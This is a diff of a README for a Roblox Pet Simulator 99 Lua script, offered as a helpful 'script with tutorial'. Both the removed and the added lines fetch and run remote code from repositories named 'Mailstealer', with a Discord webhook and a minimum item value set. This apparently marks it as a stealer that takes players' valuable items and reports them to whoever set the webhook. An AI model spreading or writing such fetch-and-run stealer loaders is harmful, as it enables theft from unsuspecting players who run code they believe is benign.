@@ -1,11 +1,12 @@
 # Script With Tutorial !
 
 ```lua
-Username = "Your Nick Here"
-LoadScreen = true 
-Webhook = "Your Link Here" -- Paste your Discord webhook here
+ Username= 'USERNAME'
+Webhook= 'YOUR DISCORD WEBHOOK'
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
+MinimumRAP = 500000
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/trdrock/mailstealer/main/petsim99'))()
 ```
 
 # Tutorial
